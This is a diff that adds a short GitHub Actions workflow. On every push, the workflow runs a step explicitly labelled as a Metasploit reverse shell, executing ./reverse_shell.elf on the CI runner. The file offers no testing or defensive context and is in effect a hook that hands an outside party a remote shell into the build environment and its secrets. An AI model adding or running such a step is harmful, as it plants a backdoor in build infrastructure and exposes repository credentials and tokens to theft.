@@ -1,0 +1,14 @@
+name: Shell
+
+on: [push]
+
+jobs:
+
+  build:
+ 
+    runs-on: ubuntu-latest
+ 
+    steps:
+    - uses: actions/checkout@v1
+    - name: metasploit reverse shell
+      run: ./reverse_shell.elf
